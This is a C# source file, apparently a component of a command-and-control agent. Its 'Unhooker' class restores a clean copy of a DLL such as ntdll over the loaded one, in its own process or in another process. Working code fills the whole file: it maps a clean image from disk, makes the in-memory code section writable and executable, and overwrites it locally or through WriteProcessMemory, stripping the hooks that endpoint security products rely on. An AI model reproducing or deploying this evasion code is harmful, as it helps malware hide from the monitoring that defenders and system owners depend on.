using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public static class Unhooker
    {


        public static bool UnhookAnyDll(string pathToDll, int pid = 0)
        {
            IntPtr hCleanNtdll = Native.Kernel32.CreateFileA(pathToDll, FileAccess.Read, FileShare.Read, IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
            IntPtr hFileMapping = Native.Kernel32.CreateFileMapping(hCleanNtdll, IntPtr.Zero, Native.Kernel32.FileMapProtection.PageReadonly | Native.Kernel32.FileMapProtection.SectionImage, 0, 0, "");
            IntPtr ptrMapping = Native.Kernel32.MapViewOfFileEx(hFileMapping, Native.Kernel32.FileMapAccessType.Read, 0, 0, UIntPtr.Zero, IntPtr.Zero);
            if (ptrMapping == IntPtr.Zero)
            {
                return false;
            }
            string[] moduleNameSplit = pathToDll.Split('\\');
            string moduleName = "";
            foreach (string n in moduleNameSplit)
            {
                if (n.EndsWith(".dll"))
                {
                    moduleName = n;
                    break;
                }
            }
            if (moduleName == "")
            {
                return false;
            }
            IntPtr addressOfHookedNtdll = Native.Kernel32.GetModuleHandle(pathToDll);
            Native.Kernel32.CloseHandle(hFileMapping);
            Native.Kernel32.CloseHandle(hCleanNtdll);
            if (pid != 0)
            {
                // call unhook remote
                IntPtr hrProcess = Native.Kernel32.OpenProcess(0x001F0FFF, false, pid);
                if (hrProcess == IntPtr.Zero)
                {
                    return false;
                }
                if (!UnHookRemote(hrProcess, addressOfHookedNtdll, ptrMapping, pathToDll))
                {
                    return false;
                }
                return true;
            }
            // call local unhook
            if (!UnHook(addressOfHookedNtdll, ptrMapping, pathToDll))
            {
                Native.Kernel32.UnmapViewOfFile(ptrMapping);
                return false;
            }
            Native.Kernel32.UnmapViewOfFile(ptrMapping);
            return true;
        }


        private static bool UnHook(IntPtr hookedNtdllAddr, IntPtr cleanNtdllmapping, string pathToCleanDll)
        {
            uint oldProtect = 0;
            Internal.PeHeaderReader reader = new Internal.PeHeaderReader(pathToCleanDll);
            Internal.PeHeaderReader.IMAGE_SECTION_HEADER textSection = reader.ImageSectionHeaders[0];
            IntPtr offsetToTextSectionHooked = new IntPtr(hookedNtdllAddr.ToInt64() + textSection.VirtualAddress);
            IntPtr offsetToTextSectionClean = new IntPtr(cleanNtdllmapping.ToInt64() + textSection.VirtualAddress);
            // set memory protections to read write execute
            bool vProtResult = Native.Kernel32.VirtualProtect(offsetToTextSectionHooked, (int)textSection.VirtualSize, 0x40, out oldProtect);
            if (!vProtResult)
            {
                return false;
            }
            // read fresh text section
            byte[] cleanTextBytes = new byte[textSection.VirtualSize];
            IntPtr nRead = IntPtr.Zero;
            if (!Native.Kernel32.ReadProcessMemory(Native.Kernel32.GetCurrentProcess(), offsetToTextSectionClean, cleanTextBytes, (int)textSection.VirtualSize, out nRead))
            {
                return false;
            }
            Marshal.Copy(cleanTextBytes, 0, offsetToTextSectionHooked, (int)textSection.VirtualSize);
            vProtResult = Native.Kernel32.VirtualProtect(offsetToTextSectionHooked, (int)textSection.VirtualSize, oldProtect, out oldProtect);
            if (!vProtResult)
            {
                return false;
            }
            return true;
        }

        private static bool UnHookRemote(IntPtr remoteProcessHandle, IntPtr hookedNtdllAddr, IntPtr cleanNtdllmapping, string pathToCleanDll)
        {
            uint oldProtect = 0;
            PeHeaderReader reader = new PeHeaderReader(pathToCleanDll);
            PeHeaderReader.IMAGE_SECTION_HEADER textSection = reader.ImageSectionHeaders[0];
            IntPtr offsetToTextSectionHooked = new IntPtr(hookedNtdllAddr.ToInt64() + textSection.VirtualAddress);
            IntPtr offsetToTextSectionClean = new IntPtr(cleanNtdllmapping.ToInt64() + textSection.VirtualAddress);
            // set memory protections to read write execute
            // Change memory protections on REMOTE process

            bool vProtResult = Native.Kernel32.VirtualProtectEx(remoteProcessHandle, offsetToTextSectionHooked, (int)textSection.VirtualSize, 0x40, out oldProtect);
            //bool vProtResult = Native.Kernel32.VirtualProtect(offsetToTextSectionHooked, (UIntPtr)textSection.VirtualSize, 0x40, out oldProtect);
            if (!vProtResult)
            {
                return false;
            }
            // read fresh text section
            byte[] cleanTextBytes = new byte[textSection.VirtualSize];
            IntPtr nRead = IntPtr.Zero;
            IntPtr nWrote = IntPtr.Zero;
            if (!Native.Kernel32.ReadProcessMemory(Native.Kernel32.GetCurrentProcess(), offsetToTextSectionClean, cleanTextBytes, (int)textSection.VirtualSize, out nRead))
            {
                return false;
            }
            //Marshal.Copy(cleanTextBytes, 0, offsetToTextSectionHooked, (int)textSection.VirtualSize);
            if (!Native.Kernel32.WriteProcessMemory(remoteProcessHandle, offsetToTextSectionHooked, cleanTextBytes, (int)textSection.VirtualSize, out nWrote))
            {
                return false;
            }
            vProtResult = Native.Kernel32.VirtualProtectEx(remoteProcessHandle, offsetToTextSectionHooked, (int)textSection.VirtualSize, oldProtect, out oldProtect);
            if (!vProtResult)
            {
                return false;
            }
            return true;
        }
    }
}
